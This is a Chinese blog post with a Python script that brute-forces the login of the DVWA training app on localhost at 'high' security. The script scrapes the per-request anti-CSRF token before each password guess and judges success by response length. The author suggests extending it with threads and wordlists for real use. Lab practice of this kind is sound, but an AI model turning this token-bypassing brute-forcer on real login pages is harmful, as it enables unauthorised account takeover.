---
title: DVWA：BruteForce-high等级爆破脚本（Python）
date: 2018-08-06 21:07:41
tags:
	- Python
	- DVWA
	- 爆破
categories: 渗透测试
keywords:
description:
---
high等级需要提交随机的token，简单的用burp爆破就不行了，只能自己写脚本从页面中获取token值。
<!-- more -->
```python
import requests
from lxml import etree


def login():
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0",
    }

    session = requests.session()

    html = session.get("http://127.0.0.1/DVWA/login.php").text
    html = etree.HTML(html)
    token = html.xpath("//input[@name='user_token']/@value")[0]

    data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token
    }
    # print(token)
    session.post("http://127.0.0.1/DVWA/login.php", data=data, headers=header)
    return session


def set_high(session):
    """设置等级为high"""
    header = {
        "User-Agent" :"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0",
    }
    html = session.get("http://127.0.0.1/DVWA/security.php").text
    html = etree.HTML(html)
    token = html.xpath("//input[@name='user_token']/@value")[0]

    data = {
        "security": "high",
        "seclev_submit": "Submit",
        "user_token": token
    }
    session.post("http://127.0.0.1/DVWA/security.php", data=data, headers=header)
    # 判断是否设置成功
    # html = session.get("http://127.0.0.1/DVWA/vulnerabilities/brute/", headers=header).text
    # link = etree.HTML(html).xpath("//input[@value='View Source']/@onclick")
    # print(link)


def main():
    session = login()
    set_high(session)

    pass_list = ["admin", "123456", "aaaaaa", "bbbbbb", "admin123", "password"]

    for pwd in pass_list:
        html = session.get("http://127.0.0.1/DVWA/vulnerabilities/brute/").text
        html = etree.HTML(html)
        token = html.xpath("//input[@name='user_token']/@value")[0]
        url = "http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&password=%s&Login=Login&user_token=%s" % (pwd, token)
        html = session.get(url).text
        print(len(html))


if __name__ == "__main__":
    main()

```

代码只临时写了一下，没有多线程，也没有从外部文件读取字典，只测试了最后可通过长度判断是否登陆成功，想要实战中用还需要自己完善代码。